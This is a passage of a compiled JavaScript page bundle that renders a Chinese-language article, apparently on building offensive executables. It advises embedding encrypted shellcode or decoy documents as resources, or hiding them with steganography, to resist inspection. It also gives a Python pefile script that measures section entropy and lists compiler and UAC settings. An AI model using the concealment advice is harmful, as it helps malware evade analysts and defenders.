"),e("h4",{attrs:{id:"资源文件"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#资源文件"}},[s._v("#")]),s._v(" 资源文件")]),s._v(" "),e("p",[s._v("我们可以将任何数据作为资源嵌入可执行文件中，例如图标，诱饵文档或shellcode。但是，使用Resource Hacker或任何类似工具，一切都将可见。嵌入加密的恶意资源或使用隐写术是一个好主意，这使得检查它们变得更加困难。")]),s._v(" "),e("h3",{attrs:{id:"熵分析"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#熵分析"}},[s._v("#")]),s._v(" 熵分析")]),s._v(" "),e("p",[s._v("熵分析可用于轻松查找嵌入在可执行文件中的潜在加密内容。加密的数据通常具有较高的熵（几乎8位）。压缩数据也是如此。")]),s._v(" "),e("p",[s._v("我们可以使用这个简单的Python脚本（一定要安装pefile模块）来计算PE文件段的熵：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("import sys\nimport math\nimport pefile\nimport peutils\n\ndef Entropy(data):\n\tentropy = 0  \n\tif not data:\n\t\treturn 0\n\tent = 0\n\tfor x in range(256):\n\t\tp_x = float(data.count(x))/len(data)\n\t\tif p_x > 0:\n\t\t\tentropy += - p_x*math.log(p_x, 2)\n\treturn entropy\n\npe=pefile.PE(sys.argv[1])\nfor s in pe.sections:\n\tprint (s.Name.decode('utf-8').strip('\\\\x00') + \"\\\\t\" + str(Entropy(s.get_data())))\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br")])]),e("h2",{attrs:{id:"编译选项"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#编译选项"}},[s._v("#")]),s._v(" 编译选项")]),s._v(" "),e("ul",[e("li",[s._v("多线程-MT")]),s._v(" "),e("li",[s._v("不生成调试信息，会泄露用户数据")])]),s._v(" "),e("p",[e("img",{attrs:{src:"https://i.loli.net/2021/03/26/IlDEh3N2ro5QPCH.jpg",alt:"-w862"}})]),s._v(" "),e("ul",[e("li",[s._v("UAC权限")])]),s._v(" "),e("p",[e("img",{attrs:{src:"https://i.loli.net/2021/03/26/Uj1FawIM9ZRJQtS.jpg",alt:"-w783"}})])])}),[],!1,null,null,null);e.default=t.exports}}]);